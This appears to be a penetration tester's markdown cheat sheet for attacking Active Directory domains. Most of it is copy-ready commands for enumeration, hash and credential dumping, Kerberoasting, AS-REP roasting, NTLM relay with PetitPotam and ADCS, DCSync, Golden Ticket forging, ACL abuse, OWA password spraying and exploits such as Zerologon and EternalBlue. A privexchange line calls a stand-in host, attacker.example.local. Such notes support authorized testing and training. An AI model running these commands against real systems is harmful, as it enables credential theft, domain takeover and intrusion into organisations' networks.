-------- 
#  **Step 1: AD Enumeration**
----------------------------------
#### User Enumeration
- What:
	- In this step we want to get all active directory users and format them into a userlist we can use to password spray or perform other attacks.
- How:
	- *Step 1* 
		- Get all AD Users

Impacket
```
impacket-getadusers -all -dc-ip <IP> 'domain/username:password"
```
CME
```
Crackmapexec smb X.X.X.X -u "username' -p "password" --users
```

- *Step 2* 
	- Then awk out the data to just show emails
```
		awk '{
		  while (match($0, /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}/)) {
		    print substr($0, RSTART, RLENGTH)
		    $0 = substr($0, RSTART + RLENGTH)
		  }
		}' your_file.txt
```

- *Step 3*
	- AWK out the email section
```
	awk '{gsub(/@<COMPANY>\.com/, ""); print}' your_file.txt > output_file.txt
```

```
**Determine Access**
cme smb x.x.x.x -u -p   (--local-auth) if local admin

**Find all share access**
cme smb x.x.x.x -u -p --shares

**Determine if your user can winrm**
crackmapexec winrm X.X.X.X -u -p 

**Sessions**
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --sessions

**Logged users**
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --loggedon-users

**Disks**
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --disks

**Groups**
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --groups

**Local groups**
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --local-groups

**Password policy**
cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>'  --pass-pol
```

#### Bloodhound
- What is it:
	- Enumerated AD information and provides insights into potential attack vectors.
	- Requires valid credentials
- How to perform it:
```
bloodhound-python -u user -p pass -ns X.X.X.X -d <domain> -c all
```
#### File/Password Hunting
- About
	- Finding files remotely from the network, I prefer using Snaffler when possible but that requires desktop access.

- How to perform it:

```
# Manspider
	# Find words in files
	manspider --threads 256 X.X.X.X/24 -u -p -c admin password  
	
	# Find file names
	manspider --threads 256 X.X.X.X/24 -u -p -f  admin  password
	
# Remotely
	DonPAPI only uses local admin
	DonPAPI.py domain/user:passw0rd@target
	DonPAPI.py --hashes <LM>:<NT> domain/user@target
	DonPAPI.py -k domain/user@target   KERBEROS
	DonPAPI.py -local_auth user@target   LOCAL ADMIN
	
# Snaffler
Seatbelt.exe -group=all -full > output.txt
Snaffler.exe -s -o snaffler_output.log -d test.local -c 10.10.10.1

```

------
## Step 2: Access Enumeration
-------- 

Where do we have access?
Hash Dumping

```
User hash
	secretsdump.py '<Domain>/<User>@<DC.IP>' -just-dc-user user1

krbtgt hash dump -> Golden Ticket
	secretsdump.py '<Domain>/<User>@<DC.IP>' -just-dc-user krbtgt

Dump with local admin
	secretsdump.py './<User>@<DC.IP>' -just-dc-user krbtgt

The best way to dump hashes is using DonPapi
	DonPAPI only uses local admin
	DonPAPI.py domain/user:passw0rd@target
	DonPAPI.py --hashes <LM>:<NT> domain/user@target
	DonPAPI.py -k domain/user@target   KERBEROS
	DonPAPI.py -local_auth user@target   LOCAL ADMIN

Hashcat Module for NTLM
	-m 1000

https://github.com/n0kovo/hashcat-rules-collection
https://github.com/n0kovo/hashcat-rules-collection
```
----------------------------------
## Step 3: AD Attacks 
-------- 
#### NoPAC
- What is it:
	- SamAccountName Spoofing which is CVE 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from standard domain user to domain admin level access in one command. This changes the SamAccountName of a computer account to a DomainController since users can add 10 machines by default. We then request the kerberos ticekts getting a DC ticket and gain system level access to the DC.

- How to perform it:
```
crackmapexec smb <Domain Controller> -u 'user' -p 'pass' -M nopac
```
#### GPP
- What is it:
	- Group Policy Preferences use to allow admins to create policies with embedded credentials to set local accounts, mapping drives, etc. New updates have prevented new policies to be created this way but old legacy policies would still have credentials stored in the SYSVOL of the DC which all users have read access. 
- How to perform it:
```
crackmapexec smb <Domain Controller> -u username -p pass -M gpp_autologin
crackmapexec smb X.X.X.X -u USER -p PASS -M gpp_password
impacket-Get-GPPPassword 'domain.local/USER:PASSWORD@X.X.X.X' 

# Metasploit (auto decrypts)
use auxiliary/scanner/smb/smb_enum_gpp

# Manually
smbclient \\\\DC-IP\\sysvol
mget * to get all policies
crack - gpp-decrypt hash
```
#### User Credentials in AD Description
- What is it:
	- Plaintext data in a users description field attribute in AD

- How to perform it:
```
crackmapexec ldap <Domain Controller> -u 'user' -p 'pass' -M get-desc-users
```
#### Kerberoasting
- What is it:
	- Kerberoasting is a lateral movement technique targetting user Service Principal Names (SPN) accounts. These are unique in kerberos used to map services to service accounts in the context of the service running which overcome the network authentication limits of built in accounts. Any account can request the kerberos ticket for a service account, including across forest trusts if permitted. You request the TGS-REP with encrypted password

- How to perform it:
```
#Network Kerberoasting
crackmapexec ldap <Domain Controller> -u 'user' -p 'pass' --kerberoasting outfile.txt
impacket-GetUserSPNs -request -outputfile LOCATION -dc-ip X.X.X cooldomain.local/user:password

# Cracking Module
hashcat 13100

# From A Windows Machine
Rubeus.exe kerberoast /outfile:<output_TGSs_file>
Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"SID-VALUE"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] 

# From Windows manual kerberoasting
https://systemweakness.com/proving-grounds-practise-active-directory-box-access-79b1fe662f4d
```
#### ASREP Roasting
- What is it:
	- User by default require an AS-REQ pre-authentication message to perform authentication and receive back an AS-REP message with a TGT containing the users password. When a user has pre-authentication disabled in Active Directory (enabled by default), an attacker can request the accounts TGT without requiring the AS-REQ pre-auth. Then crack this hash offline.
- How to perform it:
```
# CME
crackmapexec ldap <Domain Controller> -u 'user' -p 'pass' --asreproast outfile.txt

# Impacket
impacket-GetNPUsers 'domain/' -usersfile otherusers.txt -format hashcat -outputfile asrep.txt -dc-ip X.X.X.X

# Password Cracking
Hashcat module  18200
```
#### Petitpotam
- What is it:
	- This is an ADCS + Petitpotal NTLM Relay attack, only works if ADCS is present. The following must be true:
	- ADCS is configured with NTLM authentication
	- SMB Signing Disabled
	- ADCS is running Certificate Authority Web Enrollment or Web Service (ESC 8)
	- This account is CVE 2021-36942, a LSA spoofing vulnerability allowing an attacker to tell the DC to authenticate to another host via LSARPC by abusing MS-EFSRPC.
- How to perform it:
```
# CME
crackmapexec smb <Domain Controller> -u '' -p '' -M petitpotam

# Find ADCS
certipy-ad find -u NAME -p PASS -dc-ip IP

# The Relay
ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs

# Force the DC to Authenticate
.\PetitPotam.exe X.X.X.X dc01

# Rubeues Request TGT
.\Rubeus.exe asktgt /outfile:kirbi /user:dc01$ /ptt /certificate:<data>

# Validate
Use cmd prompt klist to validate TGT is present from DC01

# Perform DCSync with Mimikatz
lsadump::dcsync /user:USERNAME

```
#### Zerologon
- What is it:

- How to perform it:
```
crackmapexec smb <Domain Controller> -u Administrator -p 'Password123!' -M zerologon
```

#### Unconstrained Delegation
- What is it?
	- Created in server 2000 because services sometimes need to access resource on behalf of another user. So delegation allows the account running the resource to impersonate users connected to it who are trying to access the resource so it only shows data they would be able to see. 
	- Any service configured with unconstrained delegation can impersonate users when access any other resource. This feature is set in AD by setting the UserAccountControl attribute of the user to "TRUSTED_FOR_DELEGATION" to true,  can also be enabled by users who have the SeEnableDelegationPrivilege right which  by default only DA's have but can be assigned to users.
	- The Service sends a TGS with the user info, access rights, and a forwarded ticket-granting ticket which can be used by the service to request access to any other resource.
	- So if you compromise a machine and identify a stored TGT in memory for a delegated account, you can pass the ticket to gain access to additional resources. This is done using Mimikatz or POwersploit. 
- Perform It
#### Printer Bug
- What is it:

- How to perform it:
```
crackmapexec smb <Domain Controller> -u 'user' -p 'pass' -M spooler
impacket-rpcdump 'domain\username:PASSWORD@X.X.X.X' | egrep 'MS-RPRN|MS-PAR'
```
#### ADCS
- What is it:
	- Active Directory certificates manages certificates for systems, user, and applications to establish a public key infrastructrue. Certificates are used to establish policies which specifiy identity, validity life, purpose, and valid users for use. Attacking it usually requires us to identify the ADCS CA and using certipy to identify templates that may be vulnerable to an ESC.
	- ESC1: basic user to DA. use rubeus to request an authentication token, then use it to request a certificate on behalf of the DA they choose. Then requests another TGT as the DA.
	- ESC8 - This requires a web based certificate enrollment which are vulnerable to NTLM relay attacks. It must be using HTTP not HTTPS. The certificate must also allow client authentication and computer enrollment. 
- How to perform it:
``` 
certipy-ad find -u NAME -p PASS -dc-ip IP
```
----------------
**ACL Enumeration and Tactics**

- **What**
	- ACLs are lists that define who has access to which resource and level of access.
The settings in an ACL are called Access Control Entries ACEs which map back to user,group, or process and defines the rights.

- **Types**
	- Discretionary Access Control List DACL which security principals are granted or denied access to an object. DACLS are made up of ACEs that allow or deny access. When someone tries to access an object, the system will check DACL for the level of access that is permitted. If the DACL doesnt exist the person is granted full rights. If a DACL exists, but does not have an ACE entries specifying specific security settings, the system will deny access to all users, groups or processes attempting to access it.
	- System Access Control Lists (SACL) - allow administrators to log access attempts made to secured objects
**ACE**
1. Security Identifier (SID) of the user that has access to the object
2. Flag denoting the type of ACE (denied, allowed, or system audit)
3. Set of flags that specify if a child container/objects can inherit the given ACE entry from the primary or parent object
4. An access mask which is a 32 bit value that defines the rights granted to an object

**Exploits**
GenericAll - When we have GenericAll on a user but WE CANT change their password during a test, we do this! So instead change the users SPN to obtain their TGS ticket and crack the hash BUT you must be in the same group as them.
TO DO THIS

```
# GenericWrite
WriteOwner abused with Set-DomainObjectOwner
WriteDACL abused with Add-DomainObjectACL

#GenericAll (On Group)-  Set-DomainUserPassword or Add-DomainGroupMemberr
Powerview
     Add-DomainGroupMember -Identity 'Domain Admins' -Members 'USER' -Credential $Cred
CMD Prompt
    net group "Domain Admins" username /add /domain

#GenericAll (On User)
If you can't change the password of a user, set a fake SPN and kerberoast it
    Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\

#SeBackup
Grants all read access control to any file (read only)
------------
ForceChangePassword abused with Set-DomainUserPassword
Add Members abused with Add-DomainGroupMember
AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
Addself abused with Add-DomainGroupMember
```
**DCSync**
- What is it
	- Steal the password database by using the built-in Directory Replication Service Remote Protocol. you mimic a DC to retrieve the passwords. The right needed is the DS-Replication-Get-Changes-All
	- We need to get a user's SID who has this capability
	- Or is we have a rights over a user to add these privileges we want to and then do the attack,

- How to perform it:
```
# Doing it Via Poweview
Get user membership and their SID
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
Use Get-ObjectACL to check Replication Rights
YOU NEED THEIR SID to do this
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')}

# Via Linux 
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
```
#### Golden Ticket
- What is it
	- Golden ticket is when you rise to the level of Domain admin and extract the NThash of the krbtgt account and identify the Security identifier SID of the domain. You then forge a kerberos ticket that acts like a Ticket Granting Ticket (TGT) to replicate the DA rights. 
	- Performing it means
		- Dump the KRBTGT hash: secretdump DA:Password@DC IP
		- Lookup the SID: ookupsid.py EXAMPLE.local/Administrator:"Password"@<DC_IP_Address>
		- Forge the hash: ticketer.py -nthash bf106a6860c6f7b3317c653a38aba33 -domain-sid "S-5-1-5-21-2049251289-867822404-1193079966" -domain EXAMPLE.local Alice 
		- Set the ticket so that impacket can use it in the .ccache environment: KRB5CCNAME
		- Then simply load and PSEXEC/WMI: psexec.py $EXAMPLE.local/$Administrator@$TARGET_NAME -target-ip $TARGET_IP -dc-ip $DC_IP -no-pass -k
		- https://www.picussecurity.com/resource/blog/golden-ticket-attack-mitre-t1558.001

- USE CASE: If you can perform an attack like a DCSYNC, which requires a user to have
replication rights, then you can dump the hash and perform this attack to elevate.
#### Resource Based Contrained Delegation
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
```
mitm6 -i eth0-d <domain>
ntlmrelayx.py -t ldaps://<DomainController> -wh attacker-wpad --delegate-access
export KRB5CCNAME=<TGS_ccache_file>
secretsdump.py –k –no-pass <VictimPC
```


----------
## Miscellaneous Misconfigurations
Pingcastle
- What is it?
	- A tool used to identify vulnerabilities in Active Directory, like the Nessus of AD but better. Helps find a lot of things quickly while you are doing scans to verify you didn't miss anything. Don't rely solely on the output of Pingcastle for your pentest, its an aide, not a replacement for lack of skills.

- How to perform it:
```
# Run pingcastle to find vulnerabilities
pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD>
```
#### Reversible Encryption Enabled
- What is it?
	 - The `AllowReversiblePasswordEncryption` property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.
- This does not mean the passwords are stored in cleartext, they are just encrypted with RC4 and you need the Syskey stored in the registry to decode it.

- How to perform it:
```
**From Windows Box**
# Find users with Reversible encryption
POWERVIEW
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl  
# Check for the Rev encryption
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
# Display the Decrypted Password
The above command will create a document that displays the decrypted password
We could then do a Golden Ticket attack if we wanted BUT OUT OF SCOPE

**Remotely**

```
#### MS Exchange Domain Escalation
```
ntlmrelayx.py -t ldap://dc.example.local --escalate-user notanadmin
python privexchange.py -ah attacker.example.local exchange.example.local -u notanadmin -d 
example.local
secretsdump.py example.local/notanadmin@dc.example.local –just-dc
```
-------
## Common Vulnerabilities
- About
- These are typical vulnerabilities seen that have easy exploits in Metasploit or exploit-db, if the exploit isnt below, just search in Metasploit.
#### On_prem OWA
```
#Find the server
https://mail.target.ir/autodiscover/autodiscover.json
# Bruteforce
Import-Module MailSniper.ps1
Invoke-DomainHarvestOWA -ExchHostname mail.domain.com

#Spray
Import-Module MailSniper.ps1
Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile owa-sprayed-creds.txt
Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt

# GAL (impacket)
python GAL/exchanger.py DomainName/Username:"Password"@mail.domain.com nspi list-tables

# Proxylogon and Proxyshell Vulnerabilities
Check for these vulnerabilities
```
##### CVE-2020-2883  Weblogic Deserialization
```
Metasploit exploit
	This gave me a reverse shell, then ran NC and bin/bash shell for persistence.
	Once on a system you can crack encrypted Weblogic passwords using the wlst.sh file. This typically gives you access to login.
```
##### Nanodump
```
crackmapexec smb $TARGET -u Administrator -p 'qwerty12345' -M nanodump
```
#### Printnightmare
```
# Check if vulnerable
impacket-rpcdump @192.168.37.177 | egrep 'MS-RPRN|MS-PAR'

#Attack
	build a payload
	impacket-smbserver share 'pwd' -smb2support
	run the multihandler
	run the exploit
	A metasploit shell should build.
```

#### SMBGhost CVE-2020-0796
What
	SMBv3 vulnerability enables share access to files, data and other assets. It affects the compressions feature of SMBv3 v3.1.1 and exposes a Windows 10 1903/1909.  To exploit we send a SMBv3 packet to the server allowing RCE.
```
https://github.com/ZecOps/CVE-2020-0796-LPE-POC
https://www.exploit-db.com/exploits/48537
```
Fix It:
	Disable SMBv3 compression in the registry
```
Set-ItemProperty -Path “HKLM:SYSTEMCurrentControlSetServicesLanmanServerParameters” DisableCompression -Type DWORD -Value 1 -Force
```

#### EternalBlue/Romance/Champion
```
crackmapexec smb <subnet> -u '' -p '' -M ms17-010

If they have x32 architecture use eternalromance/eternalchampion and just change the command, all in metasploit. Typically you want TO AVOID metasploits eternalblue exploit because it breaks stuff. I have better luck just using the RCE.

```
#### Konica Minolta Printers
```
nmap -p 50001 X.X.X.X
run the metasploit gather/konica_minolta_pwd_extract
```
#### SMBleed
Pending - Metasploit Module
#### Apache Ghostcat
Pending - Metasploit module
#### SMB Lookup SID
Pending
#### PrivExchange
Pending

**Group Policy Enumeration and Attacks**
Pending

-------
# Advanced Topics (CRTO)
S4U2 Self Abuse
	Trick for local privilege escalation or alternative to silver tickets. This attack allows a service to obtain a service ticket, on behalf of a user to itself.It can be invoked by any principal with an SPN. 
S4U2Proxy
	 An account needs to have delegation enabled on the account. 
	 
Shadow Credentials
Silver Tickets
Diamond Tickets
Forged Certificates


